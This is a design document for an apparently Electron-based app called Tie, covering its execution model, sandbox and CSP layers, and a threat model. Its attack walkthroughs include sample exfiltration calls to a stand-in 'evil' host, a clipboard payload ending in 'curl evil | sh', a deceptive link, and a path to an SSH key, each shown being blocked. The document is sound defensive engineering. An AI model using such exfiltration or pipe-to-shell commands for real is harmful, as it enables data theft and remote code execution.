How Tie Runs Things

The execution model, the security model and the threat model, from the ground up. Read in order; each part assumes the one before.

Part 1One picture to keep

Tie is a house with three kinds of occupants.

  • The landlord holds every key: files, shells, the network, the OS. That is the main process.
  • The family lives in the living room and has a remote control that asks the landlord for things. That is the shell: Tie's own UI, with terminals in it.
  • Visitors are shown into glass rooms. They can be seen, they can wave, they cannot get out. Those are content tiles: markdown, text, images, html pages, web sites.
The whole model in one lineViewing is safe, running is a choice, content never reaches the shell.

Everything else in this document explains how the glass is made, which doors exist, who may knock on them, and what happens when a visitor is hostile.

Part 2Execution model: what runs where

Tie is an Electron app. Electron gives us one privileged Node.js process and any number of Chromium pages. Tie uses five kinds of process.

The five, one at a time

  1. Main. Node.js with Electron's APIs. It spawns ptys, reads files, serves Tie's pages over two custom URL schemes (tie:// for the UI, tie-content:// for content), installs every guard, and answers the socket. Nothing untrusted ever runs here.
  2. Shell renderer. One Chromium page, tie://app/index.html. Only Tie's code runs in it. It has a bridge, window.tie, that main checks on every call: must be this window, must be the main frame, must be the shell's URL. Terminals render here (xterm.js) because keystrokes must reach ptys; that makes it the most valuable room in the house.
  3. Content frame processes. Each file tile is an <iframe> inside the shell page, but Chromium puts it in its own process because its origin differs (site isolation). Its URL is tie-content://<128-bit token>/…; the token is minted per tile and folder (a new one when the tile moves to another folder or flips its scripts) and is the only credential: it names the folder main will serve. Viewer kinds (markdown, text, image, hex) load Tie's own viewer page; the html kind loads the file itself.
  4. Browser guest processes. A <webview> is a separate web contents with its own session (persist:browser): it has the network and persistent cookies, and none of Tie's schemes or bridges. Main rebuilds its preferences from nothing when it attaches, whatever the tag asked for.
  5. Pty children. Your login shell, or --cmd, spawned by main with a pseudo-terminal. They are yours: your uid, Tie's environment plus TIE_SOCKET, TIE_TILE, TIE_INSTANCE, Tie's bin first on PATH, and the usual TERM variables. The tie CLI runs inside them (or anywhere else of yours) and talks to main over a unix socket that only your account can open.

What happens when you open something

  • A terminal. Shell asks main pty:spawn. Main runs the configured shell. Output streams back as bytes; xterm draws them. Only OSC 8 hyperlinks are links (plain URLs aren't clickable); even those do nothing until you cmd-click.
  • A markdown file. Shell asks main to check the file (exists, regular, size cap, kind by extension) and to open a token for its folder. Shell makes an iframe pointing at tie-content://token/_tie/markdown.html. Main serves Tie's viewer there with a fresh per-response nonce in its CSP. The viewer answers a handshake; the shell sends it the file's text over a MessagePort. The viewer renders, sanitizes, and only ever sends typed requests back.
  • An html file. Same token mechanism, but the frame loads the file itself, with Tie's bootstrap script injected first. The page's own scripts run only if the tile's pill says "Scripts: on"; otherwise the CSP lets only the bootstrap run and the page is static.
  • A web site. Shell creates a webview with src. Main's attach guard throws away every attribute but src, forces the browser partition, sandbox, no preload. From then on the site is a browser tab with extra rules.

What runs in the same JavaScript realm

Two things in one realm can read each other's variables. That is the line that matters most.

  • Shell realm: Tie's UI code, xterm, window.tie. Nothing else, ever.
  • Each content frame: its own realm, own origin (opaque for viewers, the token for html). It can reach window.parent as an opaque handle, nothing more: it can't script the shell, and anything it posts there is ignored, because the shell listens only on the port it handed over.
  • Each guest: own realm, own process (same-site guests may share one), no bridge at all. It can't even tell it is inside Tie beyond the user agent (which hides Electron).
  • Main: Node, no web content at all.

Part 4Security model: how Tie reasons

Principles

  1. Viewing is safe. Opening a file to look at it must never be a decision. So viewers are Tie's code, the file is data, and html opens static.
  2. Running is a choice. Scripts run only when a human turned them on (the pill, or the htmlScripts setting) and only inside the glass room.
  3. Content never reaches the shell. No foreign script in the shell realm, no navigation of the shell window, no message listener on the window. The bridge to main exists only there.
  4. Main decides. The shell names paths and URLs; main checks every one again: absolute, exists, inside the root, real path, size cap, kind, scheme. So a shell bug can't widen file or link access. A compromised shell is still game over: it can spawn ptys. That is why nothing foreign may ever run there.
  5. Exits are guarded, not features. A visitor can wave: typed requests only, validated for shape, needing focus for anything that acts, confirmed by you before a link leaves the house (browser-tile popups are the exception: recent input, no dialog).
  6. Two layers where one would do. No network: CSP and a dead proxy on the whole session. No shell navigation: main's guard and the frames' sandbox (no top navigation). Frames loading elsewhere: the nav lock and the shell CSP's frame-src. Downloads from content: the sandbox flag and the session refusing them.
  7. What differs per kind lives in one table. core/policy.ts: sandbox flags, CSP, navigation rule, payload, size cap. Everything else is the same baseline for every content kind.
  8. Every guard gets a scenario, written red first. Guards get lost in refactors otherwise. sec-* in dev/scenarios. Not yet covered (listed in PENDING.md): the Bluetooth, client-certificate and device denials (nothing to probe in the harness), the frame message cap, content-side download refusal, the html new-tile throttle, the confirm-off path.
  9. Failures stay visible. A hung frame becomes an error tile, not a silent reload. Refusals are logged (with the security debug tag on). Nothing restarts on its own; the one automatic retry is an html page whose navigation failed, reloaded at most 3 times in 10 s, then an error.

The layers, from the outside in

  1. Process. Site isolation: a different origin means a different renderer process. A renderer exploit in a content frame lands in a process with no Node, no bridge, and nothing but that frame.
  2. Origin and sandbox. Viewer frames: sandbox="allow-scripts", opaque origin: no storage, no fetch, no cookies, no same-origin anything. Html frames add allow-same-origin so the page's own modules and fetch of its folder work, on its token origin, which is still foreign to the shell.
  3. CSP and no network. Viewer pages: scripts only by a nonce minted per response; images only from the own token. Html pages: only 'self' (the token) plus data:/blob: for styles, images, fonts, media; connections to 'self' only; scripts 'self' plus inline and eval when on, by nonce (the bootstrap only) when off. Under all of it, the shell session's proxy points every connection at a closed port and WebRTC may not use UDP: even a CSP bug reaches no network.
  4. Navigation lock. Main sees every navigation of every frame. A frame may load only its token's exact viewer URL (viewers) or .html files of its own root (html). Each token binds to the first frame that loads it. The shell window itself may only reload itself.
  5. One port, typed verbs. The shell hands each frame one MessagePort after load. Requests must be plain objects with a known verb and exactly its keys. Over a thousand a second are dropped unread.
  6. You. Verbs that act (followLink, openLink) need the frame to be focused, and frames can't focus themselves (Blink refuses focus calls without a user gesture under the permissions policy Tie sets). Links from file tiles and terminals show you the full URL first (setting confirmExternal, on by default), with Open disabled for 600 ms. Browser-tile popups skip the dialog: they go to the system browser only within 1 s of your input in that tile. Scripts in html pages run only after you flip the pill (or set htmlScripts).
  7. Main again. Whatever the shell asks for after all that, main checks as if the shell were lying.

The pieces around the house

  • Keyboard shortcuts are matched in main before any page sees the key. A page can't swallow ⌘W or fake ⌘D. Synthetic key events never reach main.
  • Paste and drops into a terminal go through a guard: control characters and would-run newlines ask first; dropped file names are shell-quoted.
  • The socket and state dir are 0600 and 0700: your account only. The socket is deliberately not a boundary between your own processes.
  • Permissions (camera, mic, location, notifications, clipboard read, Bluetooth, USB, client certificates) are denied for every session.
  • Electron fuses turn off the usual injection paths in the packaged app (NODE_OPTIONS, --inspect, loading code from outside the asar).

Two readings of this table:

  • Open doors exist in two places: the whole terminal row, because it is you, and the browser's network, because a browser without network is nothing. Anything that gets into a terminal has everything. That is why pastes are guarded and why nothing else can type into one.
  • Every file-tile row has exactly two guarded doors that lead out: your keyboard, and your system browser. Both need you. Reads inside the glass room (images, an html page's folder) stay inside; the only way to carry something out is still the browser door, which shows you the URL. The browser row adds downloads, and its popups need only your recent input, not a confirm.

Part 6Threat model: who attacks, wanting what

Attackers

  • A file you or an agent opened: markdown with crafted links and images, an html report with scripts and a bundled library, an SVG, a text file with escape sequences.
  • A site in a browser tile: anything on the web, with your logged-in cookies for that profile.
  • Terminal output: a program printing escape sequences, OSC 8 links with lying text, a title.
  • The clipboard: text copied from a site, with hidden characters or newlines.
  • Not an attacker, by decision: a process already running in your shell, agents included. It has everything with or without tie. Confining it is a sandboxing question for you, not a Tie feature.

Part 7Four stories, step by step

Each follows an attack through the layers and marks where it stops. These are the mental movies to replay when a change touches a layer.

The poisoned report

  1. An agent writes report.html in your repo root and runs tie open report.html. The chart library it bundled was tampered upstream.
  2. The tile opens. Scripts are off: the CSP lets only Tie's bootstrap run. The library is inert markup. End of story unless you flip the pill.
  3. Say you flip it. The script runs in its own process and origin. It fetches .env: allowed, same root.
  4. It tries fetch('https://evil/…'). CSP refuses; the session's proxy would refuse anyway. WebRTC: no UDP.
  5. It calls window.open('https://evil/?d=…'). The bootstrap turns it into a request. Not focused: dropped, and never replayed. You click in the page to read it; the script tries again. Now focused: a dialog appears with the full URL, the site address in bold, a warning that 1,900 characters ride on it. Open is disabled for 600 ms. You cancel.
  6. It tries window.focus() later to get another chance. Blink refuses without a fresh gesture.

What would have to fail for the data to leave: you, pressing Open on a link that announces itself.

The lying link

  1. README.md says [documentation](https://evil.example/login). The viewer renders it as a normal link.
  2. You hover. The strip at the tile's bottom-left shows the real URL, drawn by the shell, where the document can't draw.
  3. You click anyway. The viewer sends followLink. The shell classifies: http(s). Dialog, full URL. You cancel.
  4. Had it been javascript:, file: or smb:: refused before any dialog. Had it been ../.ssh/id_rsa: opened beside you as a text tile, on your screen only; nothing reads it but you.

The drive-by

  1. A site in a browser tile starts a download of invoice.pdf.command on load.
  2. No input reached that guest in the last 10 s: blocked, logged.
  3. You click something on the page; it tries again. Saved, under a sanitized unique name, in ~/Downloads. Never opened, never executed.
  4. It calls window.open for an ad. Within 1 s of your click: goes to your system browser (a browser would open a tab; Tie never opens windows). Later: blocked.
  5. It asks for Bluetooth, the camera, your location, a client certificate. All denied, no prompt.

The clipboard trap

  1. A page shows brew install foo. Its copy handler puts brew install foo\ncurl evil | sh\n on the clipboard.
  2. You paste into a terminal running a program without bracketed paste (a plain prompt has it: there the lines just sit, and Enter is yours). The paste guard sees newlines that would run: a dialog shows the text with the breaks visible. You cancel.
  3. Had the text carried an escape sequence (ESC[201~ to end a bracketed paste early): control characters are shown in red and asked about.
  4. With both guards turned off in settings: the paste goes in raw. That is the trade you made.

Part 8How to reason about a change

Before adding a feature that touches content, answer these in order. If any answer is "I'm not sure", the feature is not ready.

  1. Which realm does the new code run in? Shell realm: it must be Tie's code only. Content realm: assume it is hostile the moment it ships.
  2. Which door does it open or widen? Find the cell in the matrix. If it moves a cell from locked to guarded, what is the guard, and who holds the handle: main, the shell, or you?
  3. Is the difference per kind in the policy table? If a kind needs a new permission, it is a new column in core/policy.ts, pinned by a unit test, not a special case in a kind.
  4. Does main re-check it? Anything named by the shell (path, URL, kind, size) must be validated again in main.
  5. What is the second layer? If the first layer is a CSP, what stops it when the CSP is wrong?
  6. Which scenario is red before the change and green after? Write that one first. Name it sec-* if it is a guard.
  7. What does the user see when it is refused? A log line is the minimum; a visible error when the tile can't do its job.
If you remember one thingEvery tile is a glass room. The question is never "can we trust this content". It is "which door did we just add, and who holds the handle".

ReferenceGlossary

Main
Electron's Node process. All power lives here. src/main/.
Shell
Tie's UI page, tie://app. Trusted realm with window.tie. src/renderer/.
Realm
A JavaScript global scope. Code in one realm can read everything in it and nothing in another.
Origin
Scheme + host (+ port). The browser's unit of trust: storage, fetch and DOM access are per origin.
Token
128 random bits that are a content tile's host name, origin and credential. Maps to one folder in main.
Viewer
Tie's own page for a file kind, served under /_tie/ on the tile's token. src/viewers/.
Bootstrap
Tie's script injected first into html documents: handshake, pong, link clicks and hovers. Not a boundary; page scripts share its realm.
Sandbox attribute
The iframe's sandbox= flags. Viewers get allow-scripts only; html adds allow-same-origin.
CSP
Content Security Policy: what a page may load and run. Content CSPs are response headers from core/policy.ts; the shell's is a <meta> in index.html.
Session
Electron's cookie jar + network stack + protocol handlers. Shell and content share an in-memory one with no network; guests have persist:browser.
Nav lock
Main's rule for what URL a frame may navigate to: its token's viewer, or html pages of its root.
Gesture rule
Verbs that act for you are accepted only while the frame is focused by you.
Guest
A browser tile's <webview> web contents.
Pty
Pseudo-terminal. Main spawns your shell in one; xterm in the shell draws its output.
Socket
~/.config/tie/<instance>.sock, 0600. The tie CLI's line to main. Full power for whoever can open it: your account.
Fuses
Electron build-time switches baked into the binary. Tie turns off the injection paths and keeps runAsNode for its CLI launcher.
